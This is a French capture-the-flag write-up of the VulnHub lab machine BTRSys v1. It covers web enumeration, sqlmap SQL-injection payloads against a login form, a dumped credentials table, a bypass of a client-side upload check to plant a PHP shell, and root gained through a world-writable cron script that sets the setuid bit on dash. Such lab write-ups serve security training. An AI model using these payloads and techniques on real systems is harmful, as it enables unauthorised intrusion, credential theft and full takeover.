---
title: "Solution du CTF BTRSys: v1 de VulnHub"
tags: [CTF, VulnHub]
---

[BTRSys: v1](https://vulnhub.com/entry/btrsys-v1,195/) est un CTF créé par [İsmail Önder Kaya](https://twitter.com/ismailonderkaya) et proposé sur *VulnHub*. C'est un CTF simple, la seule particularité c'est que le site web du CTF est en turc mais *Google Translate* ou *Deepl* sont là pour vous aider.

On a sur ce CTF un SSH, un FTP et un serveur Apache. Le FTP n'a été d'aucune utilité dans la suite de ce CTF.

## Turkish PHP

Quand on visite le site on trouve deux pages PHP. Il est temps d'énumérer un peu plus :

```console
$ feroxbuster -u http://192.168.56.179/ -w fuzzdb/discovery/predictable-filepaths/filename-dirname-bruteforce/raft-large-words.txt -n -x php,html,txt,zip -N 10

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.4.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.56.179/
 🚀  Threads               │ 50
 📖  Wordlist              │ fuzzdb/discovery/predictable-filepaths/filename-dirname-bruteforce/raft-large-words.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.4.0
 💢  Line Count Filter     │ 10
 💲  Extensions            │ [php, html, txt, zip]
 🚫  Do Not Recurse        │ true
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
200        1l        0w        2c http://192.168.56.179/config.php
301        9l       28w      317c http://192.168.56.179/uploads
301        9l       28w      316c http://192.168.56.179/assets
301        9l       28w      320c http://192.168.56.179/javascript
200      198l      367w     4561c http://192.168.56.179/login.php
200       29l       39w      758c http://192.168.56.179/
200       29l       39w      758c http://192.168.56.179/index.php
200       80l      983w        0c http://192.168.56.179/hakkimizda.php
200        4l        0w       11c http://192.168.56.179/gonder.php
200       58l      136w     1987c http://192.168.56.179/personel.php
[####################] - 2m    598005/598005  0s      found:10      errors:0      
[####################] - 2m    598005/598005  3704/s  http://192.168.56.179/
```

On a ici un dossier `uploads` vide et une page de login qui n'était pas référencé par les deux pages visibles.

Je lance Wapiti pour qu'il scanne le site en prenant en compte la page de login :

```bash
wapiti -u http://192.168.56.179/ -s http://192.168.56.179/login.php -v2 --color
```

Pas trop de surprises à y trouver une faille SQL, car dans la page de login, on voyait une vérification en Javascript sur la présence d'une apostrophe.

```
[*] Launching module sql
[+] GET http://192.168.56.179/ (0)
[+] GET http://192.168.56.179/hakkimizda.php (1)
[+] GET http://192.168.56.179/index.php (1)
[+] GET http://192.168.56.179/login.php (0)
[+] GET http://192.168.56.179/personel.php (1)
[+] POST http://192.168.56.179/personel.php (1)
        data: kullanici_adi=wapiti2021%40mailinator.com&parola=Letm3in_
[¨] POST http://192.168.56.179/personel.php (1)
        data: kullanici_adi=wapiti2021%40mailinator.com%C2%BF%27%22%28&parola=Letm3in_
---
SQL Injection (DBMS: MySQL) in http://192.168.56.179/personel.php via injection in the parameter kullanici_adi
Evil request:
    POST /personel.php HTTP/1.1
    host: 192.168.56.179
    connection: keep-alive
    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
    accept-language: en-US
    accept-encoding: gzip, deflate, br
    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    content-type: application/x-www-form-urlencoded
    referer: http://192.168.56.179/login.php
    content-length: 72
    Content-Type: application/x-www-form-urlencoded

    kullanici_adi=wapiti2021%40mailinator.com%C2%BF%27%22%28&parola=Letm3in_
---
[¨] POST http://192.168.56.179/personel.php (1)
        data: kullanici_adi=wapiti2021%40mailinator.com&parola=Letm3in_%C2%BF%27%22%28
---
SQL Injection (DBMS: MySQL) in http://192.168.56.179/personel.php via injection in the parameter parola
Evil request:
    POST /personel.php HTTP/1.1
    host: 192.168.56.179
    connection: keep-alive
    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
    accept-language: en-US
    accept-encoding: gzip, deflate, br
    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    content-type: application/x-www-form-urlencoded
    referer: http://192.168.56.179/login.php
    content-length: 72
    Content-Type: application/x-www-form-urlencoded

    kullanici_adi=wapiti2021%40mailinator.com&parola=Letm3in_%C2%BF%27%22%28
---
```

On enchaine avec `SQLmap` :

```bash
python sqlmap.py -u http://192.168.56.179/personel.php --data "kullanici_adi=yo@yo.com&parola=123456" --dbms mysql --risk 3 --level 5
```

Ce dernier nous indique que les deux paramètres passés via `POST` sont vulnérables :

```
sqlmap identified the following injection point(s) with a total of 3372 HTTP(s) requests:
---
Parameter: kullanici_adi (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: kullanici_adi=-1454' OR 3773=3773-- vpaY&parola=123456

    Type: error-based
    Title: MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)
    Payload: kullanici_adi=yo@yo.com' OR ROW(9907,1269)>(SELECT COUNT(*),CONCAT(0x7170716a71,(SELECT (ELT(9907=9907,1))),0x71706b6b71,FLOOR(RAND(0)*2))x FROM (SELECT 5799 UNION SELECT 8295 UNION SELECT 3575 UNION SELECT 8926)a GROUP BY x)-- NBQc&parola=123456

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: kullanici_adi=yo@yo.com' AND (SELECT 9399 FROM (SELECT(SLEEP(5)))xbZi)-- Gkbz&parola=123456

    Type: UNION query
    Title: Generic UNION query (NULL) - 9 columns
    Payload: kullanici_adi=yo@yo.com' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7170716a71,0x6e6f436e546668416d59774253754873487257497545764b6a5661475747484449514550744c745a,0x71706b6b71),NULL-- -&parola=123456

Parameter: parola (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: kullanici_adi=yo@yo.com&parola=-5310' OR 8586=8586-- vQuZ

    Type: error-based
    Title: MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)
    Payload: kullanici_adi=yo@yo.com&parola=123456' OR ROW(5380,2514)>(SELECT COUNT(*),CONCAT(0x7170716a71,(SELECT (ELT(5380=5380,1))),0x71706b6b71,FLOOR(RAND(0)*2))x FROM (SELECT 8932 UNION SELECT 8533 UNION SELECT 9137 UNION SELECT 6658)a GROUP BY x)-- wnTC

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: kullanici_adi=yo@yo.com&parola=123456' AND (SELECT 1490 FROM (SELECT(SLEEP(5)))DBeo)-- lISV

    Type: UNION query
    Title: Generic UNION query (NULL) - 9 columns
    Payload: kullanici_adi=yo@yo.com&parola=123456' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x7170716a71,0x63524670634d516476747a644761724f677a555572444d764b775359576276594a4f484279564168,0x71706b6b71),NULL-- -
---
```

Nos requêtes sont exécutées avec le compte MySQL root mais l'option `--passwords` n'est pas parvenu à extraire les hashes de la BDD même en mode `--hex`.

En dumpant spécifiquement la table `mysql.user` ça fonctionne et on obtient un hash correspondant au clair `toor`.

L'autre table intéressante est celle utilisée pour la page de login :

```
Database: deneme
Table: user
[2 entries]
+----+-----------+---------+---------+-------------+-------------+-------------+--------------+------------------+
| ID | Parola    | BabaAdi | AnneAdi | Ad_Soyad    | AnneMeslegi | BabaMeslegi | KardesSayisi | Kullanici_Adi    |
+----+-----------+---------+---------+-------------+-------------+-------------+--------------+------------------+
| 1  | asd123*** | ahmet   | nazli   | ismail kaya | lokantaci   | muhasebe    | 5            | ikaya@btrisk.com |
| 2  | asd123*** | mahmut  | gulsah  | can demir   | tuhafiyeci  | memur       | 8            | cdmir@btrisk.com |
+----+-----------+---------+---------+-------------+-------------+-------------+--------------+------------------+
```

On peut alors se connecter sur le site avec `ikaya@btrisk.com` / `asd123***`. On arrive ainsi sur une page permettant l'upload de fichier.

Là encore on trouve une protection côté client (Javascript) donc bypassable :

```html
<form action="gonder.php" name="myform" method="post" enctype="multipart/form-data">
	<input type="file" id="dosya" name="dosya" accept=".jpg,.png">   
	<input type="button" value="Gonder" onclick="getFile();">
</form>
--- snip ---
<script type="text/javascript">
// accept=".jpg,.png"
function getFile(){
    var filename = document.getElementById("dosya").value;
    var sonuc = ((/[.]/.exec(filename)) ? /[^.]+$/.exec(filename) : undefined);
    if((sonuc == "jpg") || (sonuc == "gif") || (sonuc == "png")){
        document.myform.submit();
    }else{
        //mesaj
        alert("Yanlizca JPG,PNG dosyalari yukleyebilirsiniz.");
        return false;
    }
}
</script>
```

Via les dev-tools du navigateur, on peut changer le type `button` en `submit`  et retirer l'appel à Javascript. On peut alors uploader un shell PHP qui se retrouve dans le dossier `/uploads`.

## Turkish root

Une fois notre shell récupéré on remarque un dossier `troll` dans `/home` avec l'UID 1000, mais cet utilisateur n'existe plus comme indiqué dans `/etc/passwd` :

```
lololol:x:1001:1001::/home/lololol:
ps-aux:x:1003:1003::/home/ps-aux:
maleus:x:1004:1004::/home/maleus:
felux:x:1005:1005::/home/felux:
Eagle11:x:1006:1006::/home/Eagle11:
genphlux:x:1007:1007::/home/genphlux:
usmc8892:x:1008:1008::/home/usmc8892:
blawrg:x:1009:1009::/home/blawrg:
wytshadow:x:1010:1010::/home/wytshadow:
vis1t0r:x:1011:1011::/home/vis1t0r:
```

Idem, aucun des autres utilisateurs présent n'a de fichiers sur le système. Je place donc mon attention sur le compte `root` :

```console
www-data@BTRsys1:/home/troll$ find / -user root -writable -ls 2> /dev/null  | grep -v /proc | grep -v /sys
  1244    4 drwxrwxrwt   2 root     root         4096 Apr 16 07:42 /tmp
  7523    0 drwxrwxrwt   2 root     root           40 Apr 16 07:14 /run/shm
  7514    0 drwxrwxrwt   4 root     root           80 Apr 16 07:14 /run/lock
 16472    4 drwxrwxrwt   2 root     root         4096 Apr 30  2017 /var/tmp
 37475    4 -rwxrwxrwx   1 root     root           34 Aug 13  2014 /var/tmp/cleaner.py.swp
 13184    0 lrwxrwxrwx   1 root     root            9 Aug  9  2014 /var/lock -> /run/lock
156275    4 drwxrwxrwx   2 root     root         4096 Apr 16 07:36 /var/www/html/uploads
 41454    4 -rwxrwxrwx   1 root     root           23 Aug 13  2014 /var/log/cronlog
--- snip ---
  5565    0 crw-rw-rw-   1 root     root              Apr 16 07:14 /dev/zero
  5563    0 crw-rw-rw-   1 root     root              Apr 16 07:14 /dev/null
155826    4 -rwxrwxrwx   1 root     root           96 Aug 13  2014 /lib/log/cleaner.py
```

On trouve un script Python word-writable :

```python
#!/usr/bin/env python
import os
import sys
try:
        os.system('rm -r /tmp/* ')
except:
        sys.exit()
```

On peut vérifier facilement s'il est exécuté en créant un fichier dans `/tmp` :

```console
www-data@BTRsys1:/home/troll$ touch /tmp/truc.txt
www-data@BTRsys1:/home/troll$ ls /tmp/
total 8.0K
drwxrwxrwt  2 root     root     4.0K Apr 16 07:44 .
drwxr-xr-x 21 root     root     4.0K Aug  9  2014 ..
-rw-r--r--  1 www-data www-data    0 Apr 16 07:44 truc.txt
www-data@BTRsys1:/home/troll$ sleep 60
www-data@BTRsys1:/home/troll$ ls /tmp/
total 8.0K
drwxrwxrwt  2 root root 4.0K Apr 16 07:46 .
drwxr-xr-x 21 root root 4.0K Aug  9  2014 ..
```

On pourrait aussi regarder l'autre fichier remonté par find qui est explicite :

```console
www-data@BTRsys1:/home/troll$ cat /var/log/cronlog
*/2 * * * * cleaner.py
```

J'ai donc édité le script Python pour qu'il mette le bit setuid sur `dash` et attendu un peu :

```
www-data@BTRsys1:/home/troll$ ls -al /bin/dash
-rwsr-xr-x 1 root root 110K Feb 19  2014 /bin/dash
www-data@BTRsys1:/home/troll$ dash
# id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=0(root),33(www-data)
```

Pas de flag sur le système, mais on a bien les privilèges root.
